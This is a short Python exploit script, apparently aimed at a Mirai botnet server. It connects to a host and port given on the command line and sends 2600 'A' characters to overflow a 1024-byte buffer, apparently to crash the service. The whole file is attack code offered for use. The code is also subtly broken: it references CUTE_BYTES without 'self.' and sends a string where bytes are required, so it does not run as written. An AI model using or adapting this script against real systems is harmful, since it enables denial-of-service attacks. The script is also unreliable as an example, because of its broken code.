import sys
import socket

class Exploit:
    # Default buffer size of Mirai is 1024.
    # Buffer Overflow 
    
    buffer     = "A"*2600
    CUTE_BYTES = '\x00\x00%s\r\n' % buffer

    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port

    def execute(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, int(self.port)))
        s.send(CUTE_BYTES)
        s.close()

def main():
    if len(sys.argv) < 3:
        print(f'Usage: py {sys.argv[0]} <host> <port>')
        sys.exit()

    host = sys.argv[1]
    port = sys.argv[2]

    exploit = Exploit(host, port)
    exploit.execute()

if __name__ == '__main__':
    main()